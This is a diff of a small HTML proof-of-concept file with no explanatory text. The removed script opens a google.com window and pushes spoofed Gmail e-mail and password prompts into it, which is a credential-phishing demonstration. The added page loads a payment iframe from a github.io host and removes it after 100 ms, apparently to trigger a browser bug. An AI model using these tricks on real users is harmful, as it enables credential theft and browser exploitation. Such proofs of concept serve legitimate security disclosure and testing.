@@ -1,9 +1,15 @@
+<html>
+  <script>
+  function remove() {
+    let frame = document.getElementById("ifrm");
+    frame.parentNode.removeChild(frame);
+  }
+  function load() {
+    setTimeout(remove, 100);
+  }
+  </script>
+  <body onload="load()">
+    <iframe id="ifrm" src="https://lbstyle.github.io/payment.html"></iframe>
 
-<script> function go(){ 
- var x=window.open('https://www.google.com/csi'); 
- setTimeout(function(){
- a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
-  } 
- </script> 
- 
- <button onclick="go()">go</button>
+  </body>
+</html>
